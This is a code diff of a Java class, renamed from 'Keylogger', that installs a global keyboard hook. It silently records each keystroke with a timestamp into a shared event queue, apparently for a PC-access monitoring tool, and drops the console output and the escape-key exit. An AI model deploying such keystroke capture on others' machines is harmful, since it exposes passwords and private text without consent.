@@ -1,6 +1,11 @@
-package com.security.keylogger;
+package com.security.notifypcaccess.systemcapture;
 
+import java.sql.Timestamp;
 import java.util.Map.Entry;
+
+import org.jctools.queues.MpscArrayQueue;
+
+import com.security.notifypcaccess.main.SystemMonitorEvent;
 
 import lc.kra.system.keyboard.GlobalKeyboardHook;
 import lc.kra.system.keyboard.event.GlobalKeyAdapter;
@@ -15,40 +20,45 @@ import lc.kra.system.mouse.event.GlobalMouseEvent;
  *
  * This should be where the main flow starts.
  */
-public class Keylogger {
+public class SystemHookForKeyBoard implements Runnable {
 	private static boolean run = true;
+	MpscArrayQueue<SystemMonitorEvent> sharedEventQueue;
+	String loggedKeys = "";
 	
-	public static void main(String[] args) {
+	public SystemHookForKeyBoard(MpscArrayQueue<SystemMonitorEvent> sharedeventqueue) {
+		this.sharedEventQueue = sharedeventqueue;
+	}
+
+	public void run() {
+		addKeyboardHook(sharedEventQueue);
 		
-		final Keylogger keylogger = new Keylogger();
-		keylogger.addKeyboardHook();
-		System.out.println("keyboard hook added.");
-		//keylogger.addMouseHook();
 	}
 	
-	public void addKeyboardHook() {
+	public void addKeyboardHook(final MpscArrayQueue<SystemMonitorEvent> sharedEventQueue) {
 		// Might throw a UnsatisfiedLinkError if the native library fails to load or a RuntimeException if hooking fails 
 		GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true); // Use false here to switch to hook instead of raw input
-
-		System.out.println("Global keyboard hook successfully started, press [escape] key to shutdown. Connected keyboards:");
 		
-		for (Entry<Long, String> keyboard : GlobalKeyboardHook.listKeyboards().entrySet()) {
+		/*for (Entry<Long, String> keyboard : GlobalKeyboardHook.listKeyboards().entrySet()) {
 			System.out.format("%d: %s\n", keyboard.getKey(), keyboard.getValue());
-		}
+		}*/
 		
 		keyboardHook.addKeyListener(new GlobalKeyAdapter() {
 		
 			@Override 
 			public void keyPressed(GlobalKeyEvent event) {
-				System.out.println(event.getKeyChar() + "");
+				/*System.out.println(event.getKeyChar() + "");
 				if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_ESCAPE) {
 					run = false;
-				}
+				}*/
 			}
 			
 			@Override 
 			public void keyReleased(GlobalKeyEvent event) {
-				System.out.println(event.getKeyChar() + ""); 
+				event.getKeyChar();
+				Timestamp now = new Timestamp(System.currentTimeMillis());
+				SystemMonitorEvent monitorEvent = new SystemMonitorEvent(now, "keyboard", event.getKeyChar() + "");
+				sharedEventQueue.offer(monitorEvent);
+				//System.out.print(event.getKeyChar() + ""); 
 			}
 		});
 		
